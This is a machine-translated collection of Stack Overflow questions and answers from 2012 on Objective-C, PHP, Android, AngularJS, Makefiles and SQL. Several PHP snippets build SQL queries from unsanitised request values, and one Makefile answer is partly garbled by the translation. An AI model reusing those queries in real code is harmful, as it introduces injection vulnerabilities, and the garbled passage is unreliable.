Important: The mail composition interface itself is not customizable and must not be modified by your application. In addition, after presenting the interface, your application is not allowed to make further changes to the email content. The user may still edit the content using the interface, but programmatic changes are ignored. Thus, you must set the values of content fields before presenting the interface.

i have searched the forums and some have got their app rejected, so i guess u should refrain urself from doing this.

hope it helps. happy coding :)

# objective-c - XCode Objective-c 使用单个变量设置多个变量

> ID：12215956
> 
> 赞同：1
> 
> 时间：2012-08-31T13:04:04.043
> 
> 标签：objective-c, xcode

我曾经为 Windows 编写宏脚本，这是可行的：

```
VAR=0

Label>LOOP
VAR=VAR+1
ANOTHERVAR%VAR%=8 (all variables up to 30 will be set to 8)
if>VAR>=30 {Goto>BREAK}else{Goto>LOOP}
Label>BREAK
EXIT 
```

上面的代码将有效地将“ANOTHERVAR1”设置为“ANOTHERVAR30”的值 8。

现在我的问题是，我怎样才能在objective-c 上获得相同的结果？我有很多变量要设置。现在在 XCode 上我需要设置 30 个变量。我总是一一设置它们，但它占用空间，我的源代码现在超过 10k 行。

这就是我所拥有的：

```
if (Dedicatedkind==@"Cat"){
_oAttack7.alpha=0;
_oAttack7.enabled=NO;   
} 
```

这基本上禁用了非必需按钮，在这种情况下 Dedicatedkind 始终等于 Cat。我需要禁用按钮 7 到 30。但我有超过 80 种不同的 Dedicatedkind。我希望你能理解我的问题。如果我要手动设置它们，我希望能够使用更少的代码行来禁用任意数量的按钮。

像这样 ：

```
if (Dedicatedkind==@"Cat"){
_oAttack7.alpha=0;
_oAttack7.enabled=NO;
_oAttack8.alpha=0;
_oAttack8.enabled=NO;
_oAttack9.alpha=0;
_oAttack9.enabled=NO;
And so on, until I reach _oAttack30
} 
```

如果这很重要，这适用于 iPhone，我正在使用情节提要。

额外信息：

设置 enabled:NO 只是一种安全措施，因为如果满足条件，这些按钮将变为 alpha:0.3，从而重新启用它们。不幸的是，我的代码太大，无法发布每个根源和条件。这些按钮是猫学会的攻击，最多有 30 次攻击，但猫只学会了其中的 6 次。这 24 个按钮必须完全不可见，而 6 个攻击，即使尚未学习，也必须至少部分可见。在学习这些攻击时，相应的按钮变得完全可见。那是给猫的。在这个游戏中，猫是您在开始新游戏时获得的三种基本动物之一，因此具有局限性。更大、更稀有的动物可能会学习 6 次以上的攻击。

幸运的是，我已经完成了所有这些，除了必须禁用的 24 个攻击/按钮，这导致我提出了这个问题！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:10:44.997

首先，将您的按钮放入[`IBOutletCollection(UIButton)`](http://www.bobmccune.com/2011/01/31/using-ios-4s-iboutletcollection/). 您需要在界面构建器中声明一个属性并建立连接。

接下来，创建一个`NSDictionary`映射`Dedicatedkind`到[`NSIndexSet`](https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSIndexSet_Class/Reference/Reference.html). 用 80 个映射初始化字典 - 每种映射一个。有了这个字典和按钮数组，您将能够查找由 设置的索引`Dedicatedkind`，遍历其中包含的索引，并在一个简单的循环中根据需要启用/禁用按钮。作为额外的奖励，您的长链`if`/ `then`/`else`也将消失。

标题：

```
@property (nonatomic, readwrite) IBOutletCollection(UIButton) NSArray *allButtons;
NSDictionary *buttonIndexByKind; 
```

指定初始化器：

```
NSIndexSet *catSet = [NSIndexSet indexSetWithIndexesInRange:NSMakeRange(5, 30)];
NSIndexSet *dogSet = [NSIndexSet indexSetWithIndexesInRange:NSMakeRange(2, 15)];
buttonIndexByKind = [NSDictionary dictionaryWithObjectsAndKeys:
    catSet, @"Cat", dogSet, @"Dog", nil
]; 
```

当您需要启用/禁用按钮时：

```
NSIndexSet *toDisable = [buttonIndexByKind objectForKey:Dedicatedkind];
[toDisable enumerateIndexesUsingBlock:^(NSUInteger idx, BOOL *stop){
    UIButton *btn = [allButtons objectAtIndex:idx];
    btn.alpha=0;
    btn.enabled=NO;
}]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:11:25.600

你可以为你的变量做一个通用的吸气剂，比如：

```
- (id)getOAttack:(int)index {
    switch (index) {
        case 1:
            return _oAttack1;
        //etc
    }
} 
```

然后，每当您需要设置多个属性时，您都可以这样做

```
for (int i = 0; i < 30; i++) {
    id oAttack = [self getOAttack:i];
    oAttack.alpha = 0;
    oAttack.enabled = NO;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:08:54.793

为什么不将它们存储在数组或其他东西中？你甚至可以用这些值填充一些数组，并在需要时循环它们。

# python - 从解析的网页中提取 Python 文本

> ID：12215959
> 
> 赞同：2
> 
> 时间：2012-08-31T13:04:34.950
> 
> 标签：python, algorithm, text, html-parsing, text-extraction

我正在开发一个用于从网页中提取内容的小型系统（我知道它已经完成，但这是一个很好的练习，也是我需要的东西）。基本上，我希望提取内容内容，即如果它是一篇文章，我只想要文章文本而不是其他任何内容。

我才刚刚开始，所以把我当作一个愚蠢的白板。我对你如何做到这一点很感兴趣，以及用什么，特别是在 python 中，但我会对任何感兴趣

编辑：

我发现[这](http://ai-depot.com/articles/the-easy-way-to-extract-useful-text-from-arbitrary-html/)很有启发性，并且更符合我正在尝试做的事情，因此对“这类事情”的解决方案、讨论和库建议表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:11:24.810

我已经做了一点，我推荐[Mechanize](http://wwwsearch.sourceforge.net/mechanize/)和[BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/)的组合。

我建议用漂亮的汤来解析 HTML 树，并寻找一个独特的标签来识别内容，也许：

```
<div id="article"> 
```

然后你可以从“汤”中取出那个节点。

# php - 在 ajax 函数调用的 php 页面中获取参数

> ID：12215960
> 
> 赞同：0
> 
> 时间：2012-08-31T13:04:37.950
> 
> 标签：php, jquery, ajax, parameter-passing

我正在使用 jquery 和 ajax 调用 php 页面 res.php。代码是： -

```
$('#submit_button').click(function () {        
    buildingVal = $("#building");
    levelVal = $("#level");
    data = 'building=' + buildingVal.val() + 'level=' + levelVal.val();
    $.ajax( {

        url: "res.php", 
        type: "POST",
        data: data,     
        success: function (data) {
            $('#npc').html(data);
        }
    });​
}); 
```

res.php 页面代码是：-

```
<?php
//connect to the database
$con = mysql_connect("localhost","root","12345") or die("error ".mysql_error());

//connect to the travian table
mysql_select_db("trav",$con) or die("error ".mysql_error());

$building = mysql_real_escape_string($_GET['building']);
$level = mysql_real_escape_string($_GET['level']);

$query = "select * from ";
$query = $query . $building;
$query = $query . "where lvl=" . $level;
$query = $query . ";";
$result = mysql_query($query) or die('Error in Child Table!');

$data = mysql_fetch_assoc($result);

echo '<table><tr><td>Lumber=$data["lumber"]</td><td>Clay=$data["clay"]</td><td>Iron=$data["iron"]</td><td>Crop=$data["crop"]</td>';

?> 
```

我收到错误

```
Notice: Undefined index: building in C:\xampp\htdocs\debal\res.php on line 8

Notice: Undefined index: level in C:\xampp\htdocs\debal\res.php on line 9
Error in Child Table! 
```

我如何提取发送到页面的两个参数并在 sql 查询中使用它们从数据库中的表中检索数据。请问你能帮我吗..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:08:16.083

问题是您通过 AJAX 发送 $_POST 值并尝试在 res.php 页面上从 $_GET 分配变量。将 AJAX 函数更改为`type: "GET"`, 或

```
$building = mysql_real_escape_string($_POST['building']);
$level = mysql_real_escape_string($_POST['level']); 
```

在 res.php 上

你也没有正确发送“级别”变量，你错过了一个“&”

```
data = 'building=' + buildingVal.val() + '&level=' + levelVal.val(); 
```

# database - 如何加载 JFrame 包含树

> ID：12215965
> 
> 赞同：0
> 
> 时间：2012-08-31T13:04:44.103
> 
> 标签：database, swing, jtree

我正在开发一个独立的摇摆应用程序。我通过从数据库中获取值来创建树。

所以现在的问题是我想在数据库更改时重新加载每棵树，以便每棵树都有当前的数据库表值。

任何类型的指导将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:08:51.890

编写一个作业/任务/线程以在后台运行并不时查询数据库并通知所有侦听器有关任何人感兴趣的数据库中的更改。这样的侦听器之一就是您的树。

但是，请注意访问数据库的频率，这可能会导致性能问题。

# php - 在php中使用数组变量拆分并存储到列表中

> ID：12215967
> 
> 赞同：1
> 
> 时间：2012-08-31T13:04:59.817
> 
> 标签：php, arrays, list, split

我有一个从网页获取的号码，例如 $number=12-34-33-87-54-........

$number 可能有两个数字，例如 $number=12-34，也可能有 3 个数字，例如 $number=12-34-33，或者它可能有更多数字，例如 $number=12-34-33-87-54-.. ........ 等等。

我想用'-'分割它并想存储在一个数组中。像数组（12,34,33,.....）

我使用了下面给出的代码，但它不起作用。

```
<?php
$a=array();
list($a)=split('-',$number);
foreach($a as $v)
{
echo $v;
}
?> 
```

请告诉我如何拆分这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:06:26.533

虽然`split()`已[弃用](http://au.php.net/manual/en/function.split.php)，但[爆炸](http://php.net/manual/en/function.explode.php)会为您解决问题

```
<?php
$a=explode('-',$number);
foreach($a as $v)
{
    echo $v;
}
?> 
```

它假定 a`,`是默认值，因此您可以在 CSV 上使用它而无需指定。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T13:07:09.747

```
$parts = explode('-',$number); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-31T13:13:05.383

explode 将返回此数组，而不会受到您的任何干扰

```
$returnedArray = explode('-',$number); 
```

这应该适合你

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T13:10:04.340

[php爆炸](http://php.net/manual/en/function.explode.php)是你需要的。

```
$arrayOfTokens = explode('-',$number); 
```

explode 返回一个字符串数组，如提供的文档中所述。

# android - Android应用程序性能不佳

> ID：12215968
> 
> 赞同：0
> 
> 时间：2012-08-31T13:05:11.493
> 
> 标签：android

我用 C# 编写了一个爬虫程序，它**用于在给定的 url 或带有页码后缀的 url 上爬取并从中下载所有图像文件。它**工作得很好。现在我是 android 编程的新手，我想为我的 android 设备写同样的东西，这样我也可以在我的手机上使用它。

我遵循的算法是......

1) 获取基本 url、起始页码（如果 url 在查询字符串中以页码后缀）、结束页码和存储图像在 sdcard 上的位置。

2）如果结束页号小于起始页号（意味着如果我只想抓取单个页面）将其传递给 getHtml 方法。否则从开始到结束页面循环并将每个 url 传递给 getHtml 方法。

3) 在 getHtml 方法中，我下载了网页源并将其分成几部分以在其中找到指向图像文件的链接。

4) 对于找到的每个图像 url，将图像文件下载到给定的保存位置。

**算法看起来很简单，但是当我制作整个程序时，我遇到了一些相当大的性能问题。它是如此沉重，以至于在模拟器中运行它时，我只能看到 gc 清除 logcat 中的对象。另一个非常常见的问题是 UI 挂起。但由于该程序仅供个人使用，我可以使用它，因为我不知道安卓中的多线程。但至少程序应该很快。有什么办法可以减少对象的数量或自己销毁它们。**

我能做些什么来改善这一点。我想知道这些 GB 的游戏是如何完美运行的，而我的 20KB 应用程序却如此缓慢。

整个代码是。

```
package com.dwnldr;
import java.io.*;
import java.net.*;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import android.app.Activity;
import android.os.*;
import android.util.Log;
import android.view.View;
import android.widget.*;

public class IMGDwnldrActivity extends Activity {

    EditText res;
    String str;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        Button btn = (Button) findViewById(R.id.button1);
        File SDCardRoot = Environment.getExternalStorageDirectory();
        EditText saveat = (EditText) findViewById(R.id.editText4);
        saveat.setText(SDCardRoot.getAbsolutePath());
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
//Getting URL,Start pageno,End pageno and the save location on sdcard
                    EditText baseurl = (EditText) findViewById(R.id.editText1);
                    String url = baseurl.getText().toString();
                    EditText startpage = (EditText) findViewById(R.id.editText2);
                    int start = Integer.parseInt(startpage.getText().toString());
                    EditText endpage = (EditText) findViewById(R.id.editText3);
                    int end = Integer.parseInt(endpage.getText().toString());
                    EditText saveat = (EditText) findViewById(R.id.editText4);
                    String save = saveat.getText().toString();
                    if (start <= end) {
                        for (int i = start; i <= end; i++) {
                            str = "\n--------------------";
                            str += "\nPage No" + String.valueOf(i);
                            writemsg(str);
                            getHtml(url + String.valueOf(i), save);
                        }
                    } else
                        getHtml(url, save);
                    writemsg("Done");
                } catch (Exception ee) {
                    writemsg("\nException fired::" + ee.getMessage());
                }
            }
        });
    }
//method to get the source of a particular url

    public void getHtml(String url, String save) throws ClientProtocolException, IOException {
        try {
            HttpClient httpClient = new DefaultHttpClient();
            HttpContext localContext = new BasicHttpContext();
            HttpGet httpGet = new HttpGet(url);
            HttpResponse response = httpClient.execute(httpGet, localContext);
            String result = "";
            str = "\nDownloading Page....";
            writemsg(str);
            BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity().
                    getContent()));
            String line = null;
            while ((line = reader.readLine()) != null) {
                result += line + "\n";
            }
            str = "\nPage Downloaded...";
            writemsg(str);
            String[] pieces;
            if (result.contains(".jpg") || result.contains(".jpeg")) {
                pieces = result.split("\"");
                Log.d("Events", String.valueOf(pieces.length));
                for (int i = 0; i < pieces.length; i++) {
                    if (pieces[i].contains(".jpg") || pieces[i].contains(".jpeg")) {
                        if (pieces[i].contains("http")) {
                            Log.d("Events", pieces[i]);
                            downloadme(pieces[i], save);
                        } else {
                            URL u = new URL(url);
                            if (pieces[i].startsWith("."));
                            pieces[i] = pieces[i].substring(pieces[i].indexOf("/"), pieces[i].length());
                            writemsg(u.getProtocol() + "://" + u.getHost() + pieces[i]);
                            if (pieces[i].startsWith("/"))
                                downloadme(u.getProtocol() + "://" + u.getHost() + pieces[i], save);
                            else
                                downloadme(u.getProtocol() + "://" + u.getHost() + "/" + pieces[i], save);
                        }
                    }
                }
            }
        } catch (Exception ee) {
            writemsg("\nException fired::" + ee.getMessage());
        }
    }
//download each image url given

    private void downloadme(String url1, String save) {
        try {
            str = "\nDownloading Image " + url1;
            writemsg(str);
            URL url = new URL(url1);
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("GET");
            urlConnection.setDoOutput(true);
            urlConnection.connect();
            File f = new File(save);
            if (f.isDirectory() && !f.exists())
                f.mkdirs();
            String fileName = url1.substring(url1.lastIndexOf('/') + 1, url1.length());
            File file = new File(save, fileName);
            FileOutputStream fileOutput = new FileOutputStream(file);
            InputStream inputStream = urlConnection.getInputStream();
            int totalSize = urlConnection.getContentLength();
            str = "\nImage Size " + String.valueOf(totalSize / 1024);
            writemsg(str);
            byte[] buffer = new byte[1024];
            int bufferLength = 0; //used to store a temporary size of the buffer
            while ((bufferLength = inputStream.read(buffer)) > 0) {
                fileOutput.write(buffer, 0, bufferLength);
            }
            fileOutput.close();
            str = "\nDownloaded Image " + url1;
            writemsg(str);
         catch some possible 
            errors //             ...

        } catch (MalformedURLException e) {
            writemsg("\nException fired::" + e.getMessage());
        } catch (IOException e) {
            writemsg("\nException fired::" + e.getMessage());
        } catch (Exception ee) {
            writemsg("\nException fired::" + ee.getMessage());
        }
    }
//write certain text to the Result textbox

    private void writemsg(String msg) {
        res = (EditText) findViewById(R.id.result);
        String str = res.getText().toString();
        str += msg;
        res.setText(str);
    }
} 
```

# twitter-bootstrap - Twitter Bootstrap 工具提示：是否可以避免编写 javascript？

> ID：12215969
> 
> 赞同：7
> 
> 时间：2012-08-31T13:05:31.650
> 
> 标签：twitter-bootstrap

我注意到，在使用 Bootstrap 的[Tooltip](http://twitter.github.com/bootstrap/javascript.html#tooltips)时，我仍然必须手动将这一行包含在 javascript 文件中以使其工作：

```
$('[rel="tooltip"]').tooltip();​ 
```

但是，引用[文档](http://twitter.github.com/bootstrap/javascript.html)：

> 您可以完全通过标记 API 使用所有 Bootstrap 插件，而无需编写任何 JavaScript 代码。这是 Bootstrap 的第一类 API，在使用插件时应该是您的首要考虑因素。

但这不是我看到的：http: [//jsfiddle.net/ccmyx/1/](http://jsfiddle.net/ccmyx/1/)（尝试删除 Javascript 部分）。

我错过了什么吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-31T13:24:25.807

不，与所有其他 JavaScript 组件相反，Tooltip 和 Popover 都不支持 data-api。[文档](http://twitter.github.com/bootstrap/javascript.html#tooltips)中提到了这一点：

> **出于性能原因**，选择加入 Tooltip 和 Popover data-apis。如果您想使用它们，只需指定一个选择器选项。

# php - angularjs通过php删除

> ID：12215974
> 
> 赞同：0
> 
> 时间：2012-08-31T13:05:55.673
> 
> 标签：php, angularjs, sql-delete, page-refresh

我正在尝试使用 php 在 angularjs 中实现删除功能，如下所示：删除：index.html 视图：

```
<ul>
            <li ng-repeat="r in result">
            {{r.description}}|{{r.name}} | <a href='' ng-click = "edit(r.product_id)">edit</a> | <a href='' ng-click = "delete(r.product_id)">delete</a>
            <input type="hidden" name="hdnid" ng-model="hdn" value="{{r.product_id}}"/>
            </li>
        </ul> 
```

在控制器中：删除：

```
//delete
        $scope.delete = function() {
            var elem = angular.element($element);
            var dt = $(elem).serialize();
            //alert($element);
            console.log($(elem).serialize());
            $http({
                method: 'POST',
                url: 'php/delete.php',
                data: dt,
                headers: {'Content-Type': 'application/x-www-form-urlencoded'}
            }).success(function(data, status) {
                $scope.status = status;
                $scope.data = data;
                $scope.rs = data; // Show result from server in our <pre></pre> element
            }).error(function(data, status) {
                $scope.data = data || "Request failed";
                $scope.status = status;
            });
        }; 
```

并在 php 文件中：delete.php

```
 <?php
include 'connect.php';
mysql_select_db($database,$con);  
$id = $_POST['hdnid'];
$query = "delete from `product` where `product_id` = $id";
$result = mysql_query($query) OR die(mysql_error()); 
echo "You have successfully deleted ";
?> 
```

记录被删除，但页面未刷新。在刷新页面之前，我看不到已删除的记录。我哪里错了？如何刷新页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T22:05:14.950

您需要将其从范围中删除才能显示。当我们点击时，我们不需要将元素 ID 传递给范围以使其工作，我们可以使用`this`关键字捕获它

```
 $scope.delete = function() {
        //Store the this variable so we can use it in the $http functions
        var that = this
        var elem = angular.element($element);
        var dt = $(elem).serialize();
        //alert($element);
        console.log($(elem).serialize());
        $http({
            method: 'POST',
            url: 'php/delete.php',
            data: dt,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'}
        }).success(function(data, status) {
            // get the elements index and then remove it from the results array

            $scope.result.splice(that.$index, 1);
            $scope.status = status;
            $scope.data = data;
            $scope.rs = data; // Show result from server in our <pre></pre> element
        }).error(function(data, status) {
            $scope.data = data || "Request failed";
            $scope.status = status;
        });
    }; 
```

# command-line - 如何通过命令行取消定义 Makefile 中的变量

> ID：12215975
> 
> 赞同：11
> 
> 时间：2012-08-31T13:05:56.477
> 
> 标签：command-line, makefile

我想通过传递命令来从 Makefile 中取消定义变量。这可能吗？人类制造并没有太大帮助。

我想做以下事情：

我想用 FreeBSD 编译一个端口。此端口标记为`broken`。虽然我没有更改 Makefile 的权限，但我正在寻找取消定义的可能性`broken`？多变的。

编辑：在 Makefile 中是：

```
BROKEN=                 does not link 
```

我想取消设置/取消定义损坏。因为 Makefile 没有进一步执行。到目前为止，这与编译器标志无关。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:20:33.383

我认为您实际上*无法取消定义*变量。

但是，如果 'empty' 对您来说足够好：

```
make -e variable='' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-03-26T05:20:48.673

你可以这样做。下面是方法，假设这`undef`是您要用于取消定义变量的目标的名称。

```
FOO:=foo

ifeq (undef,$(filter undef,$(MAKECMDGOALS)))
override undefine FOO
endif

.PHONY: all
all:
        echo $(FOO) '($(origin FOO))'

.PHONY: undef
undef: $(if $(filter-out undef,$(MAKECMDGOALS)),,$(.DEFAULT_GOAL))) 
```

`make`使用元素说明：

*   `MAKECMDGOALS`是预定义的只读变量，包含`make`调用的目标。我们使用它来检查是否`make`被调用`undef`。
*   `.DEFAULT_GOAL`是包含默认目标的预定义变量。如果未明确设置，则将其设置为第一个目标，在本例中为`all`.
*   `ifeq`...`endif`允许 a 中的条件部分`Makefile`。
*   该`$(filter pattern,list)`函数返回`list`与 匹配的所有元素`pattern`。因此，如果作为其目标之一`make`被调用，则将是，否则它将是空字符串。`undef``$(filter undef,$(MAKECMDGOALS))``undef`
*   `$(filter-out pattern,list)`功能是相反的`$(filter key,list)`。它返回所有与`list`不匹配的元素`pattern`。因此，如果仅使用，`make`将是空字符串，否则它将是命令行上给出的所有目标的列表，不包括.`undef``$(filter-out undef,$(MAKECMDGOALS))``undef`
*   `undefine`取消定义变量。
*   `override`即使它是在命令行上传递的，也会更改变量。您需要根据您的用例决定使用是否`override`有意义。
*   如果为真，则该`$(if cond,then[,else])`函数返回，否则（如果没有，则返回空字符串）。非空字符串为真，空字符串为假。`then``cond``else``else`

因此，Makefile 取消定义`FOO`以防万一`undef`在命令行中给出。

的“神奇”依赖`undef`确保 if`undef`是命令行上给出的唯一目标，它将依赖并因此执行默认目标，在本示例中为`all`. 这是为了确保它的`make undef`行为类似于`make`它取消定义变量。

**警告**：此类`Makefile`s 的行为可能令人困惑。想象一个 Makefile 使用这种机制来排除`CPPFLAGS+=-DNDEBUG`万一`debug`被给定的情况。出乎意料的*是*，`make debug all`并`make all`为. 与 相比，预期会产生*额外*的输出。主要的期望是，无论命令行上可能另外存在什么其他目标，它的行为总是相同的。最好使用-style 机制来实现此类机制。*`make all``make debug all`*`make all``make all``configure`**

 **（来源：来自我未出版的关于 GNU make 的书。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-08-19T22:18:47.230

[http://www.gnu.org/software/make/manual/make.html#Undefine-Directive](http://www.gnu.org/software/make/manual/make.html#Undefine-Directive)

据说你可以

```
override undefine VARIABLE 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T13:14:37.050

不确定您使用的是什么编译器（我知道最近的 BSD 默认使用 clang）但是使用 gcc 您可以使用`-U`.

编辑：显然我误读了你的问题。所以你想要的是一个等价于 `make variable=X`，它将取消定义而不是设置一个值？我不相信这是可能的。

如果您无法修改现有的 makefile，您可以制作自己的副本并`make`使用该文件调用吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-04-09T22:08:02.373

有一个 -DIGNORE_BROKEN 或类似的，请查看 FreeBSD Porter 的手册，它应该有这方面的信息。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-10-20T20:48:48.210

为什么我从下面的代码中得到这个

富：=富1

ifneq ($(foo),) 覆盖 undefine foo endif

Makefile:5: 无效`override`指令**

# sql - 加入 2 个 sql 查询并连接结果？

> ID：12215976
> 
> 赞同：1
> 
> 时间：2012-08-31T13:06:06.133
> 
> 标签：sql, sql-server-2008

我有这两个查询几乎给了我需要的数据：

```
SELECT  Products.ItemID, Products.ItemID + '-' + ModifierListItems.ItemID AS SizeItemID
FROM         ModifierLists INNER JOIN
                      ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                      ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                      Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Size'
ORDER BY Products.ItemID

SELECT  Products.ItemID, ModifierListItems.ItemID AS ColorItemID
FROM         ModifierLists INNER JOIN
                      ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                      ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                      Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Color'
ORDER BY Products.ItemID 
```

我正在寻找的最终输出是 SizeItemID 与连接在 ItemID 上的 ColorItemID 连接。

2 个查询的示例结果：

```
ItemID    SizeItemID
-------   ----------
A          A-S
A          A-M
B          B-M
B          B-L

ItemID     ColorItemID
-------    -----------
A            BLK
A            WHT
B            BLK
B            WHT
B            GRN 
```

我正在寻找的结果如下：

```
FinalItemID
-----------
A-S-BLK
A-S-WHT
A-M-BLK
A-M-WHT
B-M-BLK
B-M-WHT
B-M-GRN
B-L-BLK
B-L-WHT
B-L-GRN 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:18:41.337

您可以将两个查询合并到 ItemId 上以构造最终值。

在以下查询中，我还在您的表名上使用了别名。许多人发现有意义的别名比长表名更容易阅读：

```
with tsize as (
     SELECT p.ItemID,
            p.ItemID + '-' + mli.ItemID AS SizeItemID
     FROM ModifierLists ml INNER JOIN
           ProductModifierLists pml 
           ON ml.ModifierListID = pml.ModifierListID INNER JOIN
           ModifierListItems mli
           ON ml.ModifierListID = mli.ModifierListID INNER JOIN
           Products p
           ON pml.ItemID = Products.ItemID AND
              pml.ManufacturerID = p.ManufacturerID
     WHERE (p.ManufacturerID = 262) AND ModifierListName='Size'
    ),
     tcolor as (
     SELECT  p.ItemID, mli.ItemID AS ColorItemID
     FROM ModifierLists moli INNER JOIN
          ProductModifierLists pml
          ON ml.ModifierListID = pml.ModifierListID INNER JOIN
          ModifierListItems mli
          ON ml.ModifierListID = mli.ModifierListID INNER JOIN
          Products p
          ON pml.ItemID = Products.ItemID AND
             pml.ManufacturerID = p.ManufacturerID
     WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Color'
    )
select SizeItemID+'-'+ColorItemID
from tsize join tcolor
    on tsize.itemid = tcolor.ItemID 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T13:38:44.970

好吧，最简洁的方式是将每个查询放入它自己的视图中。它还可以帮助您更好地了解您正在做的事情。因此，如果我们接受查询并创建视图：

```
CREATE VIEW v_ProductSize
AS
SELECT  Products.ItemID, Products.ItemID + '-' + ModifierListItems.ItemID AS SizeItemID
FROM         ModifierLists INNER JOIN
                      ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                      ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                      Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Size'
ORDER BY Products.ItemID

CREATE VIEW v_ProductColor
AS
SELECT  Products.ItemID, ModifierListItems.ItemID AS ColorItemID
FROM         ModifierLists INNER JOIN
                      ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                      ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                      Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Color'
ORDER BY Products.ItemID 
```

那么你就有了两个可以正常使用的简单视图，对吧？所以你的查询是：

从 v_ProductSize ps 中选择 ps.SizeItemID + '-' + pc.ColorItemID 加入 v_ProductColor pc ON ps.ItemID=pc.ItemID

看看它是如何工作的？你只是在做一个普通的连接，就像你对任何其他表一样。现在，假设您不想创建视图，或者由于某种原因没有权限。您可以跳过视图部分本身，并使用子查询。您只是用括号中的查询本身替换对视图的引用。

所以它看起来像这样：

```
SELECT ps.SizeItemID + '-' + pc.ColorItemID
FROM (
        SELECT  Products.ItemID, Products.ItemID + '-' + ModifierListItems.ItemID AS SizeItemID
         FROM         ModifierLists INNER JOIN
                               ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                               ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                               Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
         WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Size'
         ORDER BY Products.ItemID
) ps
JOIN 
     (    SELECT  Products.ItemID, ModifierListItems.ItemID AS ColorItemID
    FROM         ModifierLists INNER JOIN
                          ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID INNER JOIN
                          ModifierListItems ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID INNER JOIN
                          Products ON ProductModifierLists.ItemID = Products.ItemID AND ProductModifierLists.ManufacturerID = Products.ManufacturerID
    WHERE     (Products.ManufacturerID = 262) AND ModifierListName='Color'
    ORDER BY Products.ItemID
) pc ON ps.itemID=pc.ItemID 
```

现在......说了这么多，随着我的咖啡终于开始了，您可以通过一行修改将查询大大简化为一个：

```
SELECT  Products.ItemID, Products.ItemID + '-' + colors.ItemID + '-' + sizes.ItemID AS SizeColorItemID
FROM         ModifierLists 
INNER JOIN  ProductModifierLists ON ModifierLists.ModifierListID = ProductModifierLists.ModifierListID 
INNER JOIN ModifierListItems sizes ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID 
                                    --Put modifier list name in join clause
                                    AND ModifierListName='Size'
INNER JOIN ModifierListItems colors ON ModifierLists.ModifierListID = ModifierListItems.ModifierListID
                                    --same here, but for color
                                    AND ModifierListName = 'Color'
INNER JOIN Products ON ProductModifierLists.ItemID = Products.ItemID 
                    AND ProductModifierLists.ManufacturerID = Products.ManufacturerID               
WHERE     (Products.ManufacturerID = 262)  --Remove modifierlistitem here so you can use it in the join clauses
ORDER BY Products.ItemID 
```

